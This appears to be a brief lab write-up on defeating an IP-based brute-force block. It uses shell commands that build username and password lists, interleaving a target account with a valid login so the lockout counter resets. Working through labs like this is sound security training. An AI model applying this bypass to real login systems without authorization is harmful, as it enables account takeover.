---
tags:
  - authn
  - ip-filter
---
# Broken brute-force protection, IP block

1. Create the necessary payloads with the following commands

```
seq 100 | xargs -I{} echo 'carlos' > carlos-username.txt
```

```
sed '2~2a wiener' carlos-username.txt > ip-bypass-usernames.txt
```

```
sed '2~2a peter' portswigger-passwords.txt > ip-bypass-passwords.txt
```

2. Run the attack again with the updated payloads

![[attachments/authn-lab-4/file-20260204190632298.png]]

3. Log in with the recovered password to solve the lab

